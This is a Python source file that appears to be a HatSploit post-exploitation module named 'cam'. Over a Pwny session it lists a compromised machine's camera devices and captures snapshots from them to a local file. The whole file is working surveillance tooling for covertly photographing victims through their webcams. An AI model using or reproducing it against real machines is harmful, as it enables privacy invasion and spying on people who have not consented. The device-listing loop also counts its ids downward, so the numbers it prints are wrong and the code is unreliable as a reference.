"""
This command requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny.api import *
from pwny.types import *

from hatsploit.lib.command import Command

CAM_BASE = 5

CAM_FRAME = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL)
CAM_LIST = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL + 1)
CAM_START = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL + 2)
CAM_STOP = tlv_custom_tag(API_CALL_STATIC, CAM_BASE, API_CALL + 3)

CAM_ID = tlv_custom_type(TLV_TYPE_INT, CAM_BASE, API_TYPE)


class HatSploitCommand(Command):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "gather",
            'Name': "cam",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "Use built-in camera.",
            'Usage': "cam <option> [arguments]",
            'MinArgs': 1,
            'Options': {
                '-l': ['', 'List all camera devices.'],
                '-s': ['<id> <path>', 'Take a snapshot using device.'],
            }
        }

    def run(self, argc, argv):
        if argv[1] == '-l':
            result = self.session.send_command(
                tag=CAM_LIST
            )

            device = result.get_string(TLV_TYPE_STRING)
            id = 1

            while device:
                self.print_information(f"{str(id): <4}: {device}")
                id -= 1

                device = result.get_string(TLV_TYPE_STRING)

        elif argv[1] == '-s':
            if argc > 3:
                result = self.session.send_command(
                    tag=CAM_START,
                    args={
                        CAM_ID: int(argv[2]),
                    }
                )

                if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                    self.print_error(f"Failed to open device #{argv[2]}!")
                    return

                result = self.session.send_command(
                    tag=CAM_FRAME
                )

                if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                    self.print_error(f"Failed to read device #{argv[2]}!")
                    self.session.send_command(tag=CAM_STOP)
                    return

                frame = result.get_raw(TLV_TYPE_BYTES)

                try:
                    with open(argv[3], 'wb') as f:
                        f.write(frame)
                except Exception:
                    self.print_error(f"Failed to write image to {argv[3]}!")

                self.session.send_command(tag=CAM_STOP)
